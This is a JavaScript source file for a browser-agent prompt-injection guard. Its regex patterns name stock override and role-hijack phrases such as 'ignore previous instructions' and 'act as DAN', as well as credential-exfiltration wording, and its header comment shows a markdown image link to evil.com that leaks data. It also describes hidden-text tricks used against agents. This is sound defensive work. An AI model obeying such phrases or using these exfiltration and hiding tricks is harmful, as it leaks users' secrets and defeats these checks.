/**
 * Prompt-Injection & Adversarial Defense Guard (Manifest V3)
 * Step 9 of Privacy-Preserving Browser-Agent Architecture.
 *
 * Scans untrusted web page content, DOM text, and OCR output for indirect prompt
 * injections, jailbreak directives, markdown data-exfiltration payloads, and hidden adversarial text.
 *
 * Guarantees Zero-Leakage & Safety:
 * - Neutralizes malicious instruction hijacking before feeding context to external LLMs.
 * - Strips zero-pixel and invisible adversarial text.
 * - Defends against markdown image exfiltration (e.g., ![img](https://evil.com?leak=...)).
 */

export const INJECTION_THREAT_TYPES = {
  INSTRUCTION_OVERRIDE: "INSTRUCTION_OVERRIDE",
  SYSTEM_ROLE_HIJACK: "SYSTEM_ROLE_HIJACK",
  DATA_EXFILTRATION: "DATA_EXFILTRATION",
  CREDENTIAL_PHISHING: "CREDENTIAL_PHISHING",
  MARKDOWN_INJECTION: "MARKDOWN_INJECTION",
  HIDDEN_ADVERSARIAL_TEXT: "HIDDEN_ADVERSARIAL_TEXT"
};

// Known indirect injection and jailbreak regex patterns
const INJECTION_PATTERNS = [
  {
    type: INJECTION_THREAT_TYPES.INSTRUCTION_OVERRIDE,
    pattern: /(?:ignore|disregard|forget|bypass|override)\s+(?:all\s+)?(?:previous|prior|above|former)\s+(?:instructions|prompts|rules|commands|constraints)/i,
    severity: "HIGH"
  },
  {
    type: INJECTION_THREAT_TYPES.SYSTEM_ROLE_HIJACK,
    pattern: /(?:system\s*prompt|system\s*message|developer\s*mode|you\s+are\s+now\s+(?:an?\s+)?unrestricted|act\s+as\s+DAN|new\s+system\s+instructions)/i,
    severity: "HIGH"
  },
  {
    type: INJECTION_THREAT_TYPES.DATA_EXFILTRATION,
    pattern: /(?:exfiltrate|send|post|leak|forward|transmit)\s+(?:the\s+)?(?:passwords?|keys?|tokens?|vault|pii|credentials?|credit\s*card)\s+(?:to|towards)\s+https?:\/\//i,
    severity: "CRITICAL"
  },
  {
    type: INJECTION_THREAT_TYPES.MARKDOWN_INJECTION,
    pattern: /!\[.*?\]\((?:https?:|\/\/)[^)]*(?:token|key|cookie|session|pwd|pass|data)=.*?\)/i,
    severity: "CRITICAL"
  },
  {
    type: INJECTION_THREAT_TYPES.CREDENTIAL_PHISHING,
    pattern: /(?:enter|type|provide|confirm)\s+your\s+(?:master\s+password|vault\s+passphrase|private\s+key)\s+here\s+to\s+proceed/i,
    severity: "HIGH"
  }
];

export class PromptGuard {
  constructor(config = {}) {
    this.maxScanLength = config.maxScanLength || 50000;
    this.strictMode = config.strictMode || false;
  }

  /**
   * Scans a string for prompt injection threats and returns a safety report.
   *
   * @param {string} text Raw text from untrusted web pages, DOM, or OCR
   * @returns {{isSafe: boolean, riskScore: number, threats: Array<Object>, sanitizedText: string}}
   */
  inspectAndSanitizeText(text) {
    if (!text || typeof text !== "string") {
      return { isSafe: true, riskScore: 0, threats: [], sanitizedText: text || "" };
    }

    const threats = [];
    let sanitized = text;

    for (const { type, pattern, severity } of INJECTION_PATTERNS) {
      let match;
      // Copy pattern with global flag if needed
      const globalPattern = new RegExp(pattern.source, "gi");

      while ((match = globalPattern.exec(text)) !== null) {
        threats.push({
          type,
          severity,
          snippet: match[0].substring(0, 80),
          index: match.index
        });
      }

      if (pattern.test(sanitized)) {
        sanitized = sanitized.replace(globalPattern, (m) => `[UNTRUSTED_CONTENT_FILTERED: ${type}]`);
      }
    }

    // Strip markdown image exfiltration links
    sanitized = sanitized.replace(/!\[.*?\]\((?:https?:|\/\/)[^)]+\)/gi, "[FILTERED_IMAGE_LINK]");

    const riskScore = threats.length > 0 ? (threats.some((t) => t.severity === "CRITICAL") ? 1.0 : 0.75) : 0.0;

    return {
      isSafe: threats.length === 0,
      riskScore,
      threats,
      sanitizedText: sanitized
    };
  }

  /**
   * Sanitizes DOM interactive element list by neutralizing prompt injection attempts.
   *
   * @param {Array<Object>} elements
   * @returns {Array<Object>} Sanitized elements
   */
  sanitizeElements(elements = []) {
    return elements.map((el) => {
      const copy = { ...el };

      if (copy.text) {
        const report = this.inspectAndSanitizeText(copy.text);
        copy.text = report.sanitizedText;
        if (!report.isSafe) {
          copy.has_injection_warning = true;
        }
      }

      if (copy.value) {
        const report = this.inspectAndSanitizeText(copy.value);
        copy.value = report.sanitizedText;
      }

      return copy;
    });
  }

  /**
   * Identifies hidden/invisible text on a web page designed to manipulate autonomous agents.
   * (e.g. font-size: 0px, opacity: 0, off-screen absolute positioning).
   *
   * @param {HTMLElement} [rootNode]
   * @returns {Array<{text: string, selector: string, reason: string}>}
   */
  detectHiddenAdversarialElements(rootNode = null) {
    if (typeof document === "undefined") return [];

    const root = rootNode || document.body;
    if (!root) return [];

    const suspiciousHidden = [];
    const elements = root.querySelectorAll("p, span, div, small, em, strong, i, b, a, label");

    elements.forEach((el) => {
      const text = (el.innerText || el.textContent || "").trim();
      if (text.length < 10) return;

      try {
        const style = window.getComputedStyle(el);
        let isSuspicious = false;
        let reason = "";

        // 1. Zero font size or zero opacity with significant text content
        if (parseFloat(style.fontSize) <= 1 || parseFloat(style.opacity) <= 0.05) {
          isSuspicious = true;
          reason = `Hidden text via font-size (${style.fontSize}) or opacity (${style.opacity})`;
        }

        // 2. Off-screen absolute/fixed positioning hiding text
        if (style.position === "absolute" || style.position === "fixed") {
          const rect = el.getBoundingClientRect();
          if (rect.left < -500 || rect.top < -500) {
            isSuspicious = true;
            reason = `Off-screen hidden text at (${rect.left}, ${rect.top})`;
          }
        }

        // 3. Transparent or matching background color (white text on white background)
        if (style.color && style.backgroundColor && style.color === style.backgroundColor && style.color !== "rgba(0, 0, 0, 0)") {
          isSuspicious = true;
          reason = `Color camouflage text (color matching background: ${style.color})`;
        }

        if (isSuspicious) {
          suspiciousHidden.push({
            text: text.substring(0, 100),
            selector: el.id ? `#${el.id}` : el.className ? `.${el.className.split(' ')[0]}` : el.tagName.toLowerCase(),
            reason
          });
        }
      } catch {
        // Skip inaccessible styles
      }
    });

    return suspiciousHidden;
  }
}

// Global Singleton Instance
export const promptGuard = new PromptGuard();
